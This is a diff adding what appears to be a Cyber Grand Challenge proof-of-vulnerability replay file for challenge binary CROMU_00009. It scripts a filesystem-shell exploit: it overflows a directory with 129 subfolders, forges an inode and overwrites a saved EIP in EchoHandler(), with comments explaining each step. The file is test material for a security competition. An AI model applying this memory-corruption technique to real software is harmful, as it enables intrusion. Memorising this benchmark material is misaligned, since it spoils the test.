@@ -1,0 +1,322 @@
+<?xml version="1.0" standalone="no" ?>
+<!DOCTYPE pov SYSTEM "/usr/share/cgc-docs/replay.dtd">
+<pov>
+    <cbid>CROMU_00009</cbid>
+    <replay>
+        <read><delim>\x0a</delim><match><data>Welcome to the cgcfs shell!\x0a</data></match></read>
+        <read><delim>\x25 </delim><match><data>Type help for a list of available commands.\x0a</data></match></read>
+
+	<!-- create /testfile to allocate the first data block -->
+        <write><data>echo "\\x00\\x00\\x00\\x00" > /testfile\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>file created\x0a</data></match></read>
+
+	<!-- create the folder we'll overflow which allocates the next data block -->
+        <write><data>mkfolder /test\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+
+	<!-- fill the folder with 129 subdirectories causing the overflow -->
+        <write><data>mkfolder /test/test0\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test1\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test2\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test3\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test4\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test5\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test6\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test7\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test8\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test9\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test10\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test11\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test12\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test13\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test14\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test15\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test16\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test17\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test18\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test19\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test20\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test21\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test22\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test23\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test24\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test25\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test26\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test27\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test28\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test29\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test30\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test31\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test32\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test33\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test34\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test35\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test36\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test37\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test38\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test39\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test40\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test41\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test42\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test43\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test44\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test45\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test46\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test47\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test48\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test49\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test50\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test51\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test52\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test53\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test54\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test55\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test56\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test57\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test58\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test59\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test60\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test61\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test62\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test63\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test64\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test65\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test66\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test67\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test68\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test69\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test70\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test71\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test72\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test73\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test74\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test75\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test76\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test77\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test78\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test79\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test80\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test81\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test82\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test83\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test84\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test85\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test86\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test87\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test88\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test89\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test90\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test91\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test92\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test93\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test94\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test95\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test96\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test97\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test98\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test99\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test100\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test101\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test102\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test103\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test104\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test105\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test106\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test107\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test108\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test109\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test110\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test111\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test112\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test113\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test114\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test115\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test116\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test117\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test118\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test119\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test120\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test121\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test122\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test123\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test124\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test125\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test126\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test127\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+        <write><data>mkfolder /test/test128\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>directory created\x0a</data></match></read>
+
+	<!-- overwrite the testfile contents which overwrites the overflowed directory inode pointer -->
+	<!-- point it at the first data block of /testfile -->
+        <write><data>echo "\\x04\\xee\\xff\\xb7" > /testfile\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>\x25 </data></match></read>
+
+	<!-- build up a fake inode struct in the /testfile data block -->
+	<!-- first write the 208-byte inode filename -->
+        <write><data>echo "fake" >> /testfile\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>\x25 </data></match></read>
+        <write><data>echo "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" >> /testfile\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>\x25 </data></match></read>
+        <write><data>echo "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" >> /testfile\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>\x25 </data></match></read>
+        <write><data>echo "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" >> /testfile\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>\x25 </data></match></read>
+        <write><data>echo "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" >> /testfile\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>\x25 </data></match></read>
+        <write><data>echo "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" >> /testfile\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>\x25 </data></match></read>
+        <write><data>echo "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" >> /testfile\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>\x25 </data></match></read>
+        <write><data>echo "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" >> /testfile\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>\x25 </data></match></read>
+
+	<!-- next write the inode type (1 = file) -->
+        <write><data>echo "\\x01\\x00\\x00\\x00" >> /testfile\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>\x25 </data></match></read>
+	<!-- next the fake file's size -->
+        <write><data>echo "\\x00\\x00\\x00\\x00" >> /testfile\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>\x25 </data></match></read>
+	<!-- next the fake file's num_blocks -->
+        <write><data>echo "\\x01\\x00\\x00\\x00" >> /testfile\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>\x25 </data></match></read>
+	<!-- next the fake file's indirect_inode pointer, which isn't used -->
+        <write><data>echo "\\x00\\x00\\x00\\x00" >> /testfile\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>\x25 </data></match></read>
+	<!-- finally, set the fake file's data block pointer to the addr of saved EIP for the EchoHandler() function call -->
+        <write><data>echo "\\x98\\xae\\xaa\\xba" >> /testfile\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>\x25 </data></match></read>
+
+	<!-- and, now overwrite saved EIP by writing 00000000 to the fake file's data block -->
+        <write><data>echo "\\x00\\x00\\x00\\x00" >> /test/fake\x0a</data></write>
+        <read><delim>\x25 </delim><match><data>\x25 </data></match></read>
+
+    </replay>
+</pov>
